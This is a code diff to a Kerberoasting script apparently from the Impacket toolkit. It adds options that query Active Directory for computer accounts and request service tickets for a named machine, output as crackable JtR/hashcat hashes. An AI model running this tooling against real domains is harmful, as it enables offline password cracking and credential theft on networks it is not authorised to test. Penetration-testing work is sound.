@@ -91,8 +91,13 @@ class GetUserSPNs:
         self.__saveTGS = cmdLineOptions.save
         self.__requestUser = cmdLineOptions.request_user
         self.__stealth = cmdLineOptions.stealth
+        self.__machineOnly = cmdLineOptions.machine_only
+        self.__requestMachine = cmdLineOptions.request_machine
+
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
+
+
 
         # Create the baseDN
         domainParts = self.__targetDomain.split('.')
@@ -239,19 +244,35 @@ class GetUserSPNs:
         # Building the search filter
         filter_spn = "servicePrincipalName=*"
         filter_person = "objectCategory=person"
+        filter_computer = "objectCategory=computer"
         filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"
 
-        searchFilter = "(&"
-        searchFilter += "(" + filter_person + ")"
-        searchFilter += "(" + filter_not_disabled + ")"
+        if self.__machineOnly is True:
+            logging.debug('-machine-only flag detected')
+            searchFilter = "(&"
+            searchFilter += "(" + filter_computer + ")"
+            searchFilter += "(" + filter_not_disabled + ")"
+
+            # not updating to F-string due to other code using old string formatting
+            if self.__requestMachine is not None:
+                logging.debug('Including machine account (%s) in LDAP query filter' % self.__requestMachine)
+                searchFilter += '(sAMAccountName:=%s)' % (self.__requestMachine)
+
+        # traditional SPN based on person search
+        else:
+            searchFilter = "(&"
+            searchFilter += "(" + filter_person + ")"
+            searchFilter += "(" + filter_not_disabled + ")"
+
+            if self.__requestUser is not None:
+                searchFilter += '(sAMAccountName:=%s)' % self.__requestUser
 
         if self.__stealth is True:
             logging.warning('Stealth option may cause huge memory consumption / out-of-memory errors on very large domains.')
         else:
             searchFilter += "(" + filter_spn + ")"
 
-        if self.__requestUser is not None:
-            searchFilter += '(sAMAccountName:=%s)' % self.__requestUser
+
 
         searchFilter += ')'
 
@@ -328,7 +349,7 @@ class GetUserSPNs:
                                              "Delegation"])
             print('\n\n')
 
-            if self.__requestTGS is True or self.__requestUser is not None:
+            if self.__requestTGS is True or self.__requestUser is not None or self.__requestMachine is not None:
                 # Let's get unique user names and a SPN to request a TGS for
                 users = dict((vals[1], vals[0]) for vals in answers)
 
@@ -436,11 +457,18 @@ if __name__ == '__main__':
                                                          ' through the AS')
     parser.add_argument('-stealth', action='store_true', help='Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. '
                                                               'May cause huge memory consumption / errors on large domains.')
+    parser.add_argument('-machine-only', action='store_true', default=False, help='Queries for machine accounts only, by adjusting `objectCategory=person` to `objectCategory=computer`. Active Directory may limit results to 1,000 objects by default. LDAP paging is required to retrieve more.')
+
     parser.add_argument('-usersfile', help='File with user per line to test')
+
     parser.add_argument('-request', action='store_true', default=False, help='Requests TGS for users and output them '
                                                                              'in JtR/hashcat format (default False)')
-    parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
+    exclusive_request_group = parser.add_mutually_exclusive_group()
+    exclusive_request_group.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
                                                                                   'to the user specified (just the username, no domain needed)')
+
+    exclusive_request_group.add_argument('-request-machine', metavar='machinename', help='Requests TGS for the SPN associated to the machine specified. Example: `workstation01$`')
+
     parser.add_argument('-save', action='store_true', default=False, help='Saves TGS requested to disk. Format is '
                                                                           '<username>.ccache. Auto selects -request')
     parser.add_argument('-outputfile', action='store',
@@ -496,6 +524,10 @@ if __name__ == '__main__':
 
     if options.save is True or options.outputfile is not None:
         options.request = True
+
+    # auto enable machineonly, and request flag on -request-machine
+    if options.request_machine is not None:
+        options.machine_only = True
 
     try:
         executer = GetUserSPNs(username, password, userDomain, targetDomain, options)
